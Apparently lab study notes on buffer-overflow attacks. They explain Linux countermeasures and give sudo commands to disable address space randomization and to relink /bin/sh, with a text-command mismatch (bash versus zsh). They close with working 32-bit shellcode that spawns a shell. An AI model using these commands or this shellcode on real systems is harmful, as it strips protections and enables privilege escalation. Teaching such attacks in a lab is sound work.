# Buffer Overflow Notes

## OS Countermeasures

**Address Space Randomization**: Ubuntu and several other Linux-based systems uses address space randomization to **randomize** the **starting address of heap and stack**. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. This feature can be disabled using the following command

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

**Configuring /bin/bash**: In the recent versions of Ubuntu OS, the /bin/sh symbolic link points to the /bin/dash shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process.
To configure /bin/bash to be used as the default shell, you can change the symbolic link as follows:

```bash
sudo ln -sf /bin/zsh /bin/sh
```

**StackGuard and Non-Executable Stack**: These are two additional countermeasures implemented in the system. They can be turned off during the compilation.

## Shellcode

Example of a 32-bit shellcode that spawns a shell:

```asm
; Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp            ; ebx --> "/bin//sh": execve()’s 1st argument

; Construct the argument array argv[]
push eax                ; argv[1] = 0
push ebx                ; argv[0] --> "/bin//sh"
mov ecx, esp            ; ecx --> argv[]: execve()’s 2nd argument

; For environment variable
xor edx, edx            ; edx = 0: execve()’s 3rd argument

; Invoke execve()
xor eax, eax            ;
mov al, 0x0b            ; execve()’s system call number
int 0x80
```
